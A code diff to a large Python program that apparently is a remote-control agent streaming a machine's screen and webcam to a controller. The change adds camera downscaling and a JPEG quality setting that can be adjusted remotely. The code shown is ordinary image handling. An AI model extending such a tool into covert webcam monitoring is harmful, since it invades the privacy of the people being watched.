@@ -2695,6 +2695,8 @@ camera_encode_queue = None
 CAMERA_CAPTURE_QUEUE_SIZE = 10
 CAMERA_ENCODE_QUEUE_SIZE = 10
 TARGET_CAMERA_FPS = 15
+CAMERA_MAX_WIDTH = 640
+CAMERA_JPEG_QUALITY = 65
 SELECTED_MONITOR_INDEX = 1
 DISPLAY_MODE = 'single'
 PIP_MONITOR_INDEX = 2
@@ -10717,16 +10719,28 @@ def camera_encode_worker(agent_id):
                 except queue.Empty:
                     continue
                 
-                # Encode frame to H.264 (using JPEG as fallback since H.264 is complex)
+                # Optionally downscale to target width before encoding
                 try:
-                    # Dynamic JPEG quality based on queue fullness
+                    h, w = frame.shape[:2]
+                    target_w = int(CAMERA_MAX_WIDTH) if 'CAMERA_MAX_WIDTH' in globals() else 640
+                    if target_w > 0 and w > target_w:
+                        scale = float(target_w) / float(w)
+                        target_h = max(1, int(round(h * scale)))
+                        frame = cv2.resize(frame, (target_w, target_h), interpolation=cv2.INTER_AREA)
+                except Exception:
+                    pass
+                
+                # Encode frame to JPEG (fast fallback)
+                try:
+                    # Dynamic JPEG quality based on queue fullness relative to baseline
                     queue_fullness = camera_encode_queue.qsize() / CAMERA_ENCODE_QUEUE_SIZE
+                    base_q = int(CAMERA_JPEG_QUALITY) if 'CAMERA_JPEG_QUALITY' in globals() else 65
                     if queue_fullness > 0.8:
-                        jpeg_quality = 45
+                        jpeg_quality = max(40, base_q - 20)
                     elif queue_fullness > 0.5:
-                        jpeg_quality = 55
+                        jpeg_quality = max(45, base_q - 10)
                     else:
-                        jpeg_quality = 65
+                        jpeg_quality = base_q
                     
                     encode_param = [int(cv2.IMWRITE_JPEG_QUALITY), jpeg_quality]
                     result, encoded_frame = cv2.imencode('.jpg', frame, encode_param)
@@ -16804,7 +16818,7 @@ def on_start_stream(data):
 
 def on_set_stream_params(data):
     try:
-        global TARGET_FPS, SCREEN_MAX_WIDTH, SCREEN_JPEG_QUALITY, TARGET_CAMERA_FPS, DELTA_STREAM_ENABLED, STREAM_TILE_SIZE, DELTA_DIFF_THRESHOLD, CURSOR_EMIT_ENABLED
+        global TARGET_FPS, SCREEN_MAX_WIDTH, SCREEN_JPEG_QUALITY, TARGET_CAMERA_FPS, DELTA_STREAM_ENABLED, STREAM_TILE_SIZE, DELTA_DIFF_THRESHOLD, CURSOR_EMIT_ENABLED, CAMERA_MAX_WIDTH, CAMERA_JPEG_QUALITY
         t = str(data.get('type', 'screen') or 'screen').lower()
         fps = data.get('fps')
         width = data.get('max_width')
@@ -16832,6 +16846,10 @@ def on_set_stream_params(data):
         elif t == 'camera':
             if isinstance(fps, (int, float)) and fps > 0:
                 TARGET_CAMERA_FPS = int(fps)
+            if isinstance(width, (int, float)) and width > 0:
+                CAMERA_MAX_WIDTH = int(width)
+            if isinstance(quality, (int, float)) and 1 <= int(quality) <= 100:
+                CAMERA_JPEG_QUALITY = int(quality)
             safe_emit('agent_notification', {'type': 'info', 'title': 'Camera Params Updated', 'message': f'FPS={TARGET_CAMERA_FPS}'})
     except Exception as e:
         safe_emit('agent_notification', {'type': 'error', 'title': 'Param Update Error', 'message': str(e)})
